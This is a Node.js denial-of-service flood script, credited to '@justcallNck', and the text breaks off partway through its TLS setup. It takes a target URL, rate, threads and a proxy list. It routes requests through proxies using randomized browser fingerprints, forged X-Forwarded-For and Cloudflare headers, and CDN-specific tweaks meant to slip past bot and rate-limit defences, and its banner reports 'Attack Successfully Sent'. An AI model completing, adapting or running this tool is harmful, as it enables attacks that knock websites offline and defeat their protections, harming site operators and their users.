const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const http = require('http')
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const os = require("os");
 const util = require('util');
 const dns = require('dns');
 const fetch = require('node-fetch');
 const fs = require("fs");
 const colors = require('colors')
 const Chance = require('chance');
 const chance = new Chance();
 const lookupPromise = util.promisify(dns.lookup);
 const { v4: uuidv4 } = require('uuid');


 process.on('uncaughtException', function (exception) {
  });
 process.on('uncaughtException', function (exception) {
  });

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 if (process.argv.length < 8){
    console.log(`\x1b[31mUh oh, Wrong ussage! Please try again. The usage is: node raw.js url time rate threads proxyfile method\nThe methods are GET, POST and The methods are GET, POST and FLOOD\nNote: FLOOD is using both methods GET and POST!\x1b[0m`);
    process.exit();
 }
 let val 
 let isp
 let pro
 async function getIPAndISP(url) {
  try {
    const { address } = await lookupPromise(url);
    const apiUrl = `http://ip-api.com/json/${address}`;
    const response = await fetch(apiUrl);
    if (response.ok) {
      const data = await response.json();
       isp = data.isp;
      console.log(' ISP :', url, ':', isp);
	  if (isp === 'Cloudflare, Inc.') {
	  }else if (isp === 'Akamai Technologies, Inc.' && 'Akamai International B.V.') {
		 pro = {'Quic-Version' : '0x00000001'}
		 val = { 'NEl': JSON.stringify({
			"report_to":"default",
			"max_age":3600,
			"include_subdomains":true}),
		  }
	  } else {
		val = {'Etag': "71735e063326b9646d2a4f784ac057ff"}
		pro = {'Strict-Transport-Security': 'max-age=31536000'}
	  }
    } else {
     return
    }
  } catch (error) {
    return
   }
 }
 let headers = [];
 const current_time = new Date();
 const http_time = current_time.toUTCString();
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 

 const randInt = (min, max) => Math.floor(Math.random() * (max - min) + min);
 const randList = list => list[Math.floor(Math.random() * list.length)];
 
 const characters = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM';

 const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6],
    choose_methods: process.argv[7],
 };
 if (process.argv[7] != 'GET' && process.argv[7] != 'POST' && process.argv[7] != 'FLOOD' && process.argv[7] != 'POSTDATA') {
    console.error('Please choose a method! The methods are GET, POST, FLOOD and POSTDATA');
    process.exit(1)
 }
 let bothtomethodname = process.argv[7];
 
 if (bothtomethodname === "FLOOD") {
    bothtomethodname = "FLOOD";
 };
 if (process.argv[7] === 'GET') {
    if (process.argv.length < 9){
        console.log(`\x1b[31mUh oh, Wrong ussage! Please try again. The usage is: node raw.js url time rate threads proxyfile method true/false\x1b[0m`);
        console.log("\x1b[31mNote: FLOOD is using both methods GET and POST & True/false is using query or not.\x1b[0m")
        process.exit(1);
    }
 };
 const parsedTarget = new URL(args.target);
 const target_url = parsedTarget.host;
 parsedTarget.path = parsedTarget.pathname + parsedTarget.search;
 getIPAndISP(target_url);

 Object.prototype.shuffle = function () {
    const entries = Object.entries(this);
    for (let entry = entries.length - 1; entry > 0; entry--) {
        const index = randInt(0, entry + 1);
        [entries[entry], entries[index]] = [entries[index], entries[entry]];
    }
    return Object.fromEntries(entries);
 }

 const accept_header = [
	'*/*',
	'image/avif,image/webp,*/*',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
	'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	'application/json,text/plain,*/*',
	'text/css,*/*;q=0.1',
	'application/javascript,*/*;q=0.8',
	'application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
	'application/xml;q=0.1,text/html;q=0.9,octet-stream;q=0.7,image/png,image/*;q=0.8,*/*;q=0.5',
	'application/json,text/javascript,*/*;q=0.01',
	'application/json,text/javascript,*/*;q=0.8',
	'image/jpeg,image/gif,image/pjpeg,application/x-ms-application,application/xaml+xml,application/x-ms-xbap,*/*',
	'application/xml,application/xhtml+xml,text/html,text/plain,image/png,*/*;q=0.8',
	'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
	'image/png,image/*;q=0.8,*/*;q=0.5',
	'application/json,text/html;q=0.9,application/xhtml+xml;q=0.8',
	'image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel'
 ]; 
 const lang_header = ['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9', 'es-ES,es;q=0.9', 'it-IT,it;q=0.9', 'pt-BR,pt;q=0.9', 'ja-JP,ja;q=0.9', 'zh-CN,zh;q=0.9', 'ko-KR,ko;q=0.9', 'ru-RU,ru;q=0.9', 'ar-SA,ar;q=0.9', 'hi-IN,hi;q=0.9', 'ur-PK,ur;q=0.9', 'tr-TR,tr;q=0.9', 'id-ID,id;q=0.9', 'nl-NL,nl;q=0.9', 'sv-SE,sv;q=0.9', 'no-NO,no;q=0.9', 'da-DK,da;q=0.9', 'fi-FI,fi;q=0.9', 'pl-PL,pl;q=0.9', 'cs-CZ,cs;q=0.9', 'hu-HU,hu;q=0.9', 'el-GR,el;q=0.9', 'pt-PT,pt;q=0.9', 'th-TH,th;q=0.9', 'vi-VN,vi;q=0.9', 'he-IL,he;q=0.9', 'fa-IR,fa;q=0.9', 'ur-IN,ur;q=0.9', 'ro-RO,ro;q=0.9', 'bg-BG,bg;q=0.9', 'hr-HR,hr;q=0.9', 'sk-SK,sk;q=0.9', 'sl-SI,sl;q=0.9', 'sr-RS,sr;q=0.9', 'uk-UA,uk;q=0.9', 'et-EE,et;q=0.9', 'lv-LV,lv;q=0.9', 'lt-LT,lt;q=0.9', 'ms-MY,ms;q=0.9', 'fil-PH,fil;q=0.9', 'zh-TW,zh;q=0.9', 'es-AR,es;q=0.9', 'en', 'en,en-US;q=0.9', 'en,en-GB;q=0.9', 'en,fr-FR;q=0.9,fr;q=0.8', 'en,de;q=0.9', 'en,it;q=0.9,it-IT;q=0.8', 'en,fr-CA;q=0.9,fr;q=0.8', 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6', 'en,es;q=0.9,es-AR;q=0.8,es-MX;q=0.7', 'en,tr;q=0.9', 'en,ru;q=0.9', 'fr,en-gb;q=0.7,en;q=0.3', 'en-US;q=0.5,en;q=0.3', 'fr-CH,fr;q=0.9', 'en;q=0.8,de;q=0.7', 'de;q=0.7,*;q=0.5', 'en-US,en;q=0.5', 'es-mx,es,en', 'vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3', 'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7', 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 'de-CH;q=0.7', 'da, en-gb;q=0.8, en;q=0.7', 'cs;q=0.5', 'en-CA,en;q=0.9', 'en-AU,en;q=0.9', 'en-NZ,en;q=0.9', 'en-ZA,en;q=0.9', 'en-IE,en;q=0.9', 'en-IN,en;q=0.9', 'ca-ES,ca;q=0.9', 'cy-GB,cy;q=0.9', 'eu-ES,eu;q=0.9', 'gl-ES,gl;q=0.9', 'gu-IN,gu;q=0.9', 'kn-IN,kn;q=0.9', 'ml-IN,ml;q=0.9', 'mr-IN,mr;q=0.9', 'nb-NO,nb;q=0.9', 'nn-NO,nn;q=0.9', 'or-IN,or;q=0.9', 'pa-IN,pa;q=0.9', 'sw-KE,sw;q=0.9', 'ta-IN,ta;q=0.9', 'te-IN,te;q=0.9', 'zh-HK,zh;q=0.9', 'fil-PH,fil;q=0.8', 'fr-CA,fr;q=0.8', 'fr-CH,fr;q=0.8', 'fr-BE,fr;q=0.8', 'fr-LU,fr;q=0.8', 'vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3'];
 const encoding_header = ['gzip, deflate, br', 'gzip, deflate', 'gzip, br', 'deflate, br', 'gzip', 'deflate', 'br'];
 const control_header = [
    'max-age=0',
	'no-cache',
	'no-store',
	'no-transform',
	'only-if-cached',
 ];

 const FA = ['Amicable', 'Benevolent', 'Cacophony', 'Debilitate', 'Ephemeral',
  'Furtive', 'Garrulous', 'Harangue', 'Ineffable', 'Juxtapose', 'Kowtow',
  'Labyrinthine', 'Mellifluous', 'Nebulous', 'Obfuscate', 'Pernicious',
  'Quixotic', 'Rambunctious', 'Salient', 'Taciturn', 'Ubiquitous', 'Vexatious',
  'Wane', 'Xenophobe', 'Yearn', 'Zealot', 'Alacrity', 'Belligerent', 'Conundrum',
  'Deliberate', 'Facetious', 'Gregarious', 'Harmony', 'Insidious', 'Jubilant',
  'Kaleidoscope', 'Luminous', 'Meticulous', 'Nefarious', 'Opulent', 'Prolific',
  'Quagmire', 'Resilient', 'Serendipity', 'Tranquil', 'Ubiquity', 'Voracious', 'Whimsical'];
 const mad = ['Amicable', 'Benevolent', 'Cacophony', 'Debilitate', 'Ephemeral',
  'Furtive', 'Garrulous', 'Harangue', 'Ineffable', 'Juxtapose', 'Kowtow',
  'Labyrinthine', 'Mellifluous', 'Nebulous', 'Obfuscate', 'Pernicious',
  'Quixotic', 'Rambunctious', 'Salient', 'Taciturn', 'Ubiquitous', 'Vexatious',
  'Wane', 'Xenophobe', 'Yearn', 'Zealot', 'Alacrity', 'Belligerent', 'Conundrum',
  'Deliberate', 'Facetious', 'Gregarious', 'Harmony', 'Insidious', 'Jubilant',
  'Kaleidoscope', 'Luminous', 'Meticulous', 'Nefarious', 'Opulent', 'Prolific',
  'Quagmire', 'Resilient', 'Serendipity', 'Tranquil', 'Ubiquity', 'Voracious', 'Whimsical'];
 const FAB = ['Aberration', 'Benevolence', 'Catalyst', 'Dichotomy', 'Ephemeral',
  'Fecund', 'Garrulous', 'Harmony', 'Ineffable', 'Juxtapose', 'Kindle', 'Labyrinthine',
  'Mirthful', 'Nebulous', 'Obfuscate', 'Pernicious', 'Quintessential', 'Rambunctious',
  'Surreptitious', 'Tangible', 'Ubiquitous', 'Vicarious', 'Whimsical', 'Xenial',
  'Yonder', 'Zephyr', 'Allure', 'Benevolent', 'Cacophony', 'Dulcet', 'Enigmatic',
  'Fervor', 'Gregarious', 'Halcyon', 'Ineffable', 'Jubilant', 'Kaleidoscope',
  'Luminous', 'Mellifluous', 'Nefarious', 'Opulent', 'Prolific', 'Quixotic',
  'Resilient', 'Serenity', 'Tranquil', 'Unabashed', 'Voracious', 'Wanderlust', 'Xenophile', 'Yearning', 'Zestful'];
 
 var mad1 = mad[Math.floor(Math.floor(Math.random() * mad.length))];
 var FA1 = FA[Math.floor(Math.floor(Math.random() * FA.length))];
 var FAB1 = FAB[Math.floor(Math.floor(Math.random() * FAB.length))];
 const dest_header = ['document', 'empty', 'iframe', 'font', 'image', 'script'];
 const mode_header = ['cors', 'no-cors', 'navigate', 'same-origin', 'websocket'];
 const site_header = ['cross-site', 'same-site', 'same-origin', 'none'];
 const referers = [
	parsedTarget.href,
    parsedTarget.origin,
    "https://www.google.com",
    "https://www.bing.com",
    "https://coccoc.com",
    "https://es.wikipedia.org",
    "https://en.wikipedia.org",
    "https://duckduckgo.com",
    "https://new.qq.com",
    "https://www.ecosia.org",
    "https://search.naver.com",
    "https://yandex.com",
    "https://www.baidu.com",
    "https://search.yahoo.com",
 ];
 const referer = randList(referers);
 const versions = {
	APPLE: () => {
		const octets = [];
		octets[0] = randInt(10, 20);
		octets[1] = randInt(0, 10);
		const lastDigit = randInt(0, 10);
		if (lastDigit !== 0) octets[2] = lastDigit;
		return octets.join('_');
	},
	ANDROID: () => {
		const octets = [];
		octets[0] = randInt(5, 15);
		const secondaryDigit = randInt(0, 10);
		const lastDigit = randInt(0, 10);
		if (secondaryDigit !== 0) octets[1] = secondaryDigit;
		if (lastDigit !== 0) octets[2] = lastDigit;
		return octets.join('.');
	},
	SAFARI: () => {
		const octets = [];
		octets[0] = randInt(500, 600);
		octets[1] = '1';
		const safariLastDigit = randInt(0, 20);
		if (safariLastDigit !== 0) octets[2] = safariLastDigit;
		return octets.join('.')
	},
	ANDROID_DEVICE: () => path('*', '*', 2) + '-' + randList(characters) + randInt(100, 1000) + randList(characters),
	CHROME: () => Math.random() < 0.5 ? '121' + '.0.' + randInt(4000, 6000) + '.' + randInt(10, 200) : '121.0.0.0',
	MOBILE: () => randInt(10, 20) + randList(characters).toUpperCase() + randInt(10, 200)
 };

    function getUserAgent() {
        const randVersions = {
            apple: versions.APPLE(),
            android: versions.ANDROID(),
            safari: versions.SAFARI()
        };
        const systems = [
            'Windows NT 10.0; Win64; x64',
            'Windows NT 10.0; WOW64',
            'Windows NT 10.0',
            'X11; Linux x86_64',
            'Macintosh; Intel Mac OS X ' + randVersions.apple,
            'iPhone; CPU iPhone OS ' + randVersions.apple + ' like Mac OS X',
            'iPad; CPU OS ' + randVersions.apple + ' like Mac OS X',
            'iPod; CPU iPhone OS ' + randVersions.apple + ' like Mac OS X',
            'Linux; Android ' + randVersions.android + '; ' + versions.ANDROID_DEVICE().toUpperCase(),
            'Linux; Android ' + randVersions.android + '; K'
        ];
        const system = randList(systems);
        const engine = system.includes('CPU') ? 'Mobile/' + versions.MOBILE() + ' Safari/' + randVersions.safari : 'Safari/' + randVersions.safari;
        return 'Mozilla/5.0 (' + system + ') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + versions.CHROME() + ' ' + engine;
    }

 function randIPv4() {
    let address;
    do {
        const firstOctet = randInt(1, 224);
        if (
            firstOctet === 0 ||
            firstOctet === 10 ||
            firstOctet === 100 ||
            firstOctet === 127 ||
            firstOctet === 169 ||
            firstOctet === 172 ||
            firstOctet === 192 ||
            firstOctet === 198 ||
            firstOctet === 203
        ) {
            continue;
        }
        if (firstOctet >= 224 && firstOctet <= 239) {
            continue;
        }
        address = firstOctet + '.' + randInt(1, 256) + '.' + randInt(1, 256) + '.' + randInt(1, 256);
    } while (!address);
    return address;
 }

 function path(input, sign, length) {
	let output = '';
	for (let index = 0; index < length; index++) {
		output += randList(characters);
	}
	return input.split(sign).join(output);
 }


 var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var proxies = readLines(args.proxyFile);

 const MAX_RAM_PERCENTAGE = 95;
 const RESTART_DELAY = 1000;

 if (cluster.isMaster) {
    const proxyList = readLines(args.proxyFile);
    console.clear();
    console.log(` Made By @justcallNck \x1b[31mwith luv <3\x1b[0m`)
    console.log(`\x1b[93m  [?] Attack Details:\x1b[0m`)
    console.log(` ----------------------`)
    console.log(`   -   Status    : [ \x1b[32mAttack Successfully Sent\x1b[0m ]`)
    console.log(`   -   Target    : [ \x1b[34m${parsedTarget.host}\x1b[0m ]`)  
    console.log(`   -   Time      : [ \x1b[34m${process.argv[3]}\x1b[0m ]`)
    console.log(`   -   Rps       : [ \x1b[34m${process.argv[4]}\x1b[0m ]`)
    console.log(`   -   Threads   : [ \x1b[34m${process.argv[5]}\x1b[0m ]`)
    console.log(`   -   Method    : [ \x1b[34m${bothtomethodname}\x1b[0m ]`)
    console.log(`   -   Proxyfile : [ \x1b[34m${process.argv[6]}\x1b[0m ] | Total(s): [ \x1b[34m${proxyList.length}\x1b[0m ]`)
    console.log(`----------------------------------------------------------------------`)
    console.log(`| \x1b[31m[!] Note: \x1b[0mrecommend use good and big proxyfile if hit hard targets.|`)
    console.log(`----------------------------------------------------------------------`)
    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script via', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage percentage exceeded:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
  setInterval(handleRAMUsage, 1000);
  
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {setInterval(startNckFlood) }
 

  class NetSocket {
    constructor() {}
  
    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);
  
        const connection = net.connect({
            host: options.host,
            port: options.port
        });
  
        connection.setTimeout(options.timeout * 100000);
        connection.setKeepAlive(true, 100000);
  
        connection.on("connect", () => {
            connection.write(buffer);
        });
  
        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });
  
        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });
  
        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
    
    }
 function generateRandomString(minLength, maxLength) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
        const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
        let result = '';
        
        for (let i = 0; i < length; i++) {
            const randomIndex = Math.floor(Math.random() * characters.length);
            result += characters.charAt(randomIndex);
        }
    
        return result;
    }

 function generateRandomUpperCaseLetter() {
    const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
    const randomIndex = Math.floor(Math.random() * alphabet.length);
    const randomLetter = alphabet.charAt(randomIndex);
    return randomLetter;
  }
  
  function generateRandomUpperCaseString(length) {
    let result = '';
    for (let i = 0; i < length; i++) {
      result += generateRandomUpperCaseLetter();
    }
    return result;
  }

  function generateRandomEmail() {
    const firstName = chance.first().toLowerCase();
    const lastName = chance.last().toLowerCase();
    const randomString = chance.string({ length: 5, pool: 'abcdefghijklmnopqrstuvwxyz0123456789' }).toLowerCase();
    const domain = [
      "@hotmail.com",
      "@outlook.com.vn",
      "@outlook.uk.com",
      "@yahoo.com",
      "@rambler.ru",
      "@gmail.com",
      "@nck.ovh",
      "@cloudflare.com"
    ];
    const rand_domain = domain[Math.floor(Math.random() * domain.length)]
    const email = `${firstName}.${lastName}.${randomString}${rand_domain}`;
    return email;
  }
 function getRandomPhone() {
    return `+${Math.floor(1000000000 + Math.random() * 9000000000)}`;
 }

 function getRandomUUID() {
    return uuidv4();
}	

 const randomEmail = generateRandomEmail();

 const randomUpperCaseString = generateRandomUpperCaseString(65);

 const platformuserAgent = getUserAgent();

 const platform = platformuserAgent.includes('Windows') ? '"Windows"' : platformuserAgent.includes('X11') ? '"Linux"' : platformuserAgent.includes('Android') ? '"Android"' : platformuserAgent.includes('Macintosh') ? '"macOS"' : platformuserAgent.includes('like Mac OS X') ? '"iOS"' : '"Unknown"';

 const viaValues = [
	'1.0 squid (squid/5.2)',
	'1.1 ::ffff:' + randIPv4() + ' (Mikrotik HttpProxy)',
	'1.1 ' + randIPv4() + ' (Mikrotik HttpProxy)',
	'1.0 ' + randIPv4() + ' (squid/4.7)',
 ];
 
 const hash = crypto.createHash('md5').update(new Date() * Math.random() + "").digest('hex');
 
 const platformVersions = ['"6.2.0"', '"15.0.0"', '"13.4.0"', '"13.0.0"'];
 
 const weightValues = [1, 220, 255, 256];
 function getRandomDate(start = new Date(2000, 0, 1), end = new Date()) {
    return new Date(start.getTime() + Math.random() * (end.getTime() - start.getTime()));
 }

 const methods = ["POST", "GET"];

 const fakeHeaders = {
    'x-real-ip': randIPv4(),
    'x-forwarded-host': parsedTarget.host,
    'x-forwarded-server': parsedTarget.host,
    'x-forwarded-for': randIPv4(),
    'x-forwarded-proto': 'https',
 };

//  const mayberateHeaders = [
//     {...fakeHeaders.shuffle()},
//     {...(Math.random() < 0.5 && {"x-request-id": getRandomUUID()})},
//     {...(Math.random() < 0.5 && {"x-email": generateRandomEmail()})},
//     {...(Math.random() < 0.5 && {"x-phone": getRandomPhone()})},
//     {...(Math.random() < 0.5 && {"date": getRandomDate().toUTCString()})},
//     {...val},
//     {...pro},
//     {...(Math.random() < 0.5 ? {"ect": ["4g", "3g", "2g"][Math.floor(Math.random() * 3)]} : {})},
//     {...(Math.random() < 0.5 ? {"device-memory": Math.floor(Math.random() * 8) + 1} : {})},
//  ];
 const rateHeaders = [
    { 'CF-Visitor': '{"scheme":"https"}' },
    { 'CDN-Loop': 'cloudflare' },
    { 'CF-RAY': hash.substring(0, 16) + '-HKG' },
    { 'CF-Worker': parsedTarget.host },
    { 'CF-IPCountry': 'US' },
    { 'dnt': '1' },
    { 'device-memory': '0.25' },
    { 'viewport-height': '1080' },
    { 'x-forwarded-port': '443' },
    { 'x-forwarded-protocol': 'https' },
    { 'pragma': 'no-cache' },
    { 'via': randList(viaValues) },
    { 'cookie': hash.substring(16, 24) + '=' + hash.substring(24, 32) },
    { 'worker': 'true'},
    { 'sec-ch-ua-wow64': '?0' },
    { 'sec-ch-ua-model': versions.ANDROID_DEVICE().toUpperCase() },
    { 'sec-ch-ua-arch': 'x86' },
    { 'sec-ch-ua-bitness': '64' },
    { 'sec-ch-ua-full-version': '"120.0.6099.227"' },
    { 'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.227", "Google Chrome";v="120.0.6099.227"' },
    { 'sec-ch-ua-platform-version': randList(platformVersions) },
    { 'priority': 'u=0, i' },
 ];

 const ipv4 = randIPv4()

 const rd = [
    { "A-IM": "Feed" },
    { "accept": accept },
    { "accept-charset": accept },
    { "accept-datetime": accept },
    { "accept-encoding": encoding },
    { "accept-language": lang },
    { "upgrade-insecure-requests": "1" },
    { "Access-Control-Request-Method": "GET" },
    { "Cache-Control": "no-cache" },
    { "Content-Encoding": "gzip" },
    { "content-type": "text/html" },
    { "cookie": hash.substring(16, 24) + '=' + hash.substring(24, 32) },
    { "Expect": "100-continue" },
    { "Forwarded": `for=${ipv4}proto=http;by=` + randIPv4() },
    { "From": randomEmail },
    { "Max-Forwards": "10" },
    { "pragma": "no-cache" },
    { "CF-Worker": parsedTarget.host },
    { "CF-Connecting-IP": randIPv4() }, 
    { "CF-EW-Client-IP": randIPv4() }, 
    { "CF-Challenge-Response": randstrs(32) },
    { "CF-Request-ID": randstrs(24) },
    { "CF-Ray": hash.substring(0, 16) + '-HKG' },
    { "CF-Ratelimit-Remaining": Math.floor(Math.random() * 100) },
    { "CF-Ratelimit-Limit": Math.floor(Math.random() * 200) + 100 },
  ];
  
  const rd1 = [
    { "Via": '1.1' + parsedTarget.host },
    { "X-Requested-With": "XMLHttpRequest" },
    { "X-Forwarded-For": randIPv4() },
    { "X-Vercel-Cache": randstrs(15) },
    { "Alt-Svc": "http/1.1=http2." + parsedTarget.host + "; ma=7200" },
    { "downlink": Math.floor(Math.random() * 10) + 1 },
    { "TK": "?" },
    { "X-Frame-Options": "deny" },
    { "X-ASP-NET": randstrs(25) },
    { "Refresh": "5" },
    { "RTT": Math.floor(Math.random() * 3000) + 1 },
    { "X-Content-duration": randIPv4() },
    { "service-worker-navigation-preload": Math.random() < 0.5 ? 'true' : 'null' },
    { "CF-Connecting-IP": randIPv4() }, 
    { "CF-EW-Client-IP": randIPv4() }, 
    { "CF-Challenge-Response": randstrs(32) },
    { "CF-Request-ID": randstrs(24) },
    { "CF-WAF-Action": "Manage challenge" },
    { "CF-Ratelimit-Remaining": Math.floor(Math.random() * 100) },
    { "CF-Ratelimit-Limit": Math.floor(Math.random() * 200) + 100 },
  ];

 const reqSettings = {
	parent: 0,
	exclusive: true,
	weight: randList(weightValues),
 };


 const p = parsedTarget.path.replace(/%RAND%/g, () => Array.from({ length: 16 }, () => Math.floor(Math.random() * 36).toString(36)).join(''));
 function buildPathWithQuery(parsedTarget, useQuery) {
    if (useQuery) {
        return parsedTarget.path + '?' + generateRandomString(5, 15) + '=' + generateRandomString(20, 25);
    } else {
        return path(parsedTarget.path, '[rand]', 8);
    };
 };

 function randstrs(length) {
    const characters = "0123456789";
    const charactersLength = characters.length;
    const randomBytes = crypto.randomBytes(length);
    let result = "";
    for (let i = 0; i < length; i++) {
        const randomIndex = randomBytes[i] % charactersLength;
        result += characters.charAt(randomIndex);
    }
    return result;
 }

 const useQuery = process.argv[8] === 'true';
 const Socker = new NetSocket();
 async function startNckFlood() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":"); 

     const proxyOptions = {
         host: parsedProxy[0],
         port: +parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 100,
     };

     Socker.HTTP(proxyOptions, async (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 600000);

         const tlsOptions = {
            ALPNProtocols: ['h2'],
            sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
